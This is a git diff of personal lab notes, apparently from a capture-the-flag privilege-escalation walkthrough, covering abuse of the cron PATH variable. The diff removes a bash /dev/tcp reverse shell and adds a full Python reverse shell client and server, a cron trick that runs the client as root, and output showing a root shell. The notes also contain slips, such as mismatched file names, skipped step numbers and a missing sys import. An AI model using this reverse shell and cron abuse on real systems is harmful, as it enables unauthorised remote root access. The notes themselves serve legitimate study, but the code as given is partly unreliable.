@@ -511,22 +511,118 @@ root@ip-10-10-43-228:~#
 find /tmp -name test.py
 ```
 * Cron refers to paths listed under `PATH` variable in `/etc/crontab` file if full script is not defined.
-* Create script named `test.py` in `/tmp` folder to be run by the cron job.
-1. `nano tmp/test.py`
-2. Enter reverse shell code.
+* Create script named `test1.py` in `/tmp` folder to be run by the cron job.
+1. `nano /tmp/test1.py`
+2. Enter reverse shell client code from [PYTHON REVERSE SHELL](https://medium.com/@rietesh/python-reverse-shell-hack-your-neighbours-552561336ca8).
 ```
-#!/bin/bash
+import socket
+import os
+import subprocess
 
-bash -i >& /dev/tcp/10.10.16.10/6666 8>&1
+# set target IP and port
+target_host = "10.10.234.130"
+target_port = 6666
+
+# create client TCP socket
+# connect socket to target IP and port
+client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+client.connect((target_host,target_port))
+
+# receive command in data object and decode back to string
+# check if command is cd and use os.chdir to change directory
+# directly open a process for other commands and give the decoded string
+# pipe out stdout, stdin, and stderr
+# bytes piped into output_bytes, converted into string and sent across connection
+# connection closed when while loop breaks
+while True:
+    data = client.recv(1024)
+    if data[:2].decode("utf-8") == 'cd':
+        os.chdir(data[3:].decode("utf-8"))
+    if len(data) > 0:
+        cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output_bytes = cmd.stdout.read()
+        output_str = str(output_bytes, "utf-8")
+        client.send(str.encode(output_str + str(os.getcwd()) + '$'))
+        #print(output_str)
+client.close()
 ```
 4. CTRL+X to save and exit.
-5. Make script executable.
+* Create `test.py` cron job file to run reverse shell.
+1. `nano /tmp/test1.py`.
+2. Add code to execute `test`.py`.
 ```
-chmod +x ./antivirus.sh
+python3 /tmp/test1.py
+```
+5. Make files executable.
+```
+chmod +x /tmp/test.py /tmp/test1.py
 ```
 6. Create listener on attacking machine to catch connection.
+   * Enter reverse shell server code from [PYTHON REVERSE SHELL](https://medium.com/@rietesh/python-reverse-shell-hack-your-neighbours-552561336ca8).
+   * `nano ./Desktop/Python_Reverse_Shell_Server.py`.
 ```
-nc -lvnp 6666
+import socket
+import threading
+import os
+
+# define send_commands function that accepts socket object
+# encode commands and send across connection (conn.send)
+# make received data readable by converting to UTF-8 string
+# add end="" to responses to avoid new line character and move cursor to end
+def send_commands(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            server.close()
+            sys.exit()
+        if len(str.encode(cmd)) > 0:
+            conn.send(str.encode(cmd))
+            client_response = str(conn.recv(1024), "utf-8")
+            print(client_response, end="")
+
+# set attacker's IP and port
+bind_ip = "10.10.234.130"
+bind_port = 6666
+serv_add = ((bind_ip),(bind_port))
+
+# create socket object and bind to server address
+# listen for connections every 5 seconds
+server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+print (serv_add)
+server.bind((serv_add))
+server.listen(5)
+print ("[*] listening on {}:{}".format(bind_ip,bind_port))
+
+# accept successful connections
+# print out details and ask for commands to be executed
+conn,addr = server.accept()
+print('accepted connection from {} and port {}'.format(addr[0],addr[1]))
+print("enter the commands below")
+
+# call send_commands function
+# close connection if IF statement breaks
+send_commands(conn)
+conn.close()
+```
+* Start Python listener on attacking machine.
+```
+python ./Desktop/python_reverse_shell_server.py 
+('10.10.234.130', 6666)
+[*] listening on 10.10.234.130:6666
+```
+* Run Python reverse shell code on target.
+```
+python3 /tmp/test.py
+```
+* Reverse shell caught by listener.
+  * Cron job ran successfully as root.
+```
+accepted connection from 10.10.114.83 and port 33502
+enter the commands below
+whoami
+root
+/root$
 ```
 ## Privilege Escalation: PATH
 ## Privilege Escalation: NFS
